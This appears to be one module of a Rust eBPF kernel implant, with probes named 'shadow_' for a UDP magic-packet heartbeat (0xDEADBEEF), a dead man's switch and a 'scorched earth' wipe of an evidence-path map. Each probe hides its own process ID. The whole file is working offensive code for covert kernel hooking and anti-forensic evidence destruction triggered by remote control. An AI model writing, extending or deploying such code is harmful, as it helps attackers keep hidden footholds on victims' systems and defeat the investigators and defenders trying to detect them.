use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::kprobe,
    programs::ProbeContext,
};
use common::{EventHeader, EVENT_DEADMAN_ARMED, EVENT_HEARTBEAT_RECEIVED, EVENT_SCORCHED_EARTH};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 70: Heartbeat Monitor
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_udp_heartbeat(ctx: ProbeContext) -> u32 {
    try_udp_heartbeat(&ctx).unwrap_or_default()
}

fn try_udp_heartbeat(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let skb_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let data_ptr: u64 = unsafe { bpf_probe_read_kernel((skb_ptr + 208) as *const u64)? };

    let magic: u32 = unsafe { bpf_probe_read_kernel(data_ptr as *const u32)? };

    const HEARTBEAT_MAGIC: u32 = 0xDEAD_BEEF;

    if magic == HEARTBEAT_MAGIC {
        let now = unsafe { bpf_ktime_get_ns() };

        if let Some(slot) = unsafe { HEARTBEAT_TRACKER.get_ptr_mut(0) } {
            unsafe { *slot = now };
        }

        let event = EventHeader {
            event_type: EVENT_HEARTBEAT_RECEIVED,
            pid,
            timestamp_ns: now,
            context: magic as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 71: Dead Man's Switch Arming
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_deadman_check(ctx: ProbeContext) -> u32 {
    try_deadman_check(&ctx).unwrap_or_default()
}

fn try_deadman_check(_ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let armed = match unsafe { DEADMAN_CONFIG.get(0) } {
        Some(&v) => v,
        None => return Ok(0),
    };
    if armed == 0 {
        return Ok(0);
    }

    let now = unsafe { bpf_ktime_get_ns() };
    let last_hb = match unsafe { HEARTBEAT_TRACKER.get(0) } {
        Some(&v) => v,
        None => return Ok(0),
    };

    let interval = match unsafe { DEADMAN_CONFIG.get(1) } {
        Some(&v) => v,
        None => 30_000_000_000, // 30 second default
    };

    if now.wrapping_sub(last_hb) > interval {
        if let Some(wipe) = unsafe { WIPE_FLAG.get_ptr_mut(0) } {
            unsafe { *wipe = 1 };
        }

        let event = EventHeader {
            event_type: EVENT_DEADMAN_ARMED,
            pid,
            timestamp_ns: now,
            context: now.wrapping_sub(last_hb),
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 72: Scorched Earth Wipe
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_scorched_earth(ctx: ProbeContext) -> u32 {
    try_scorched_earth(&ctx).unwrap_or_default()
}

fn try_scorched_earth(_ctx: &ProbeContext) -> Result<u32, i64> {
    let wipe = match unsafe { WIPE_FLAG.get(0) } {
        Some(&v) => v,
        None => return Ok(0),
    };
    if wipe == 0 {
        return Ok(0);
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    for i in 0u32..32 {
        let _ = unsafe { EVIDENCE_PATHS.remove(&i) };
    }

    let event = EventHeader {
        event_type: EVENT_SCORCHED_EARTH,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: 0xDEAD,
    };
    let _ = EVENTS.output(&event, 0);

    Ok(0)
}
